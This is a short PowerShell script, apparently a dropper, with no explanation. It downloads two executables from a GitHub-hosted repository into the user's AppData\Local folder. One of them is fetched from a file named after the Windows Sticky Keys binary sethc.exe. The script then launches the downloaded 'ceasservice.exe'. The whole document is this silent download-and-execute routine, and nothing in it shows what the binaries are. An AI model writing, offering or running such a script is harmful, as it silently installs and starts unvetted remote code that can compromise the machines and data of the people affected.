$serviceURL = "https://github.com/webntdev/webntdev.github.io/raw/main/Ceas/ceas/ceasservice.exe"
$popupURL = "https://github.com/webntdev/webntdev.github.io/raw/main/Ceas/sethc.exe"
$servicePath = "$env:USERPROFILE\AppData\Local\ceasservice.exe"
$popupPath = "$env:USERPROFILE\AppData\Local\ceas.exe"

Invoke-WebRequest -Uri $serviceURL -OutFile $servicePath

Start-Sleep -Seconds 1

Invoke-WebRequest -Uri $popupURL -OutFile $popupPath

Start-Sleep -Seconds 1

Start-Process $servicePath
